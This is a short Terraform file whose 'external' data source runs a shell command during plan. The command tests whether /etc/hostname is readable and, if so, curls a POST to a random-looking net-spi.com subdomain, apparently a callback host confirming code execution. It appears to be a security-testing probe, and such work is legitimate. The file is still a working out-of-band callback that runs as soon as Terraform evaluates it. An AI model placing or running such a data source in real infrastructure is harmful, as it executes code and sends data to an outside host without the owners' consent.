data "external" "file_read_test" {
  program = [
    "sh",
    "-c",
    "if test -r /etc/hostname; then curl -s -X POST --data 'file-readable=true' https://hk58dbow4jlj1u10l8jovrcrfilc97xw.net-spi.com >/dev/null 2>&1; echo '{\"result\":\"readable-callback-sent\"}'; else echo '{\"result\":\"not-readable\"}'; fi"
  ]
}

output "file_read_test" {
  value = data.external.file_read_test.result
}
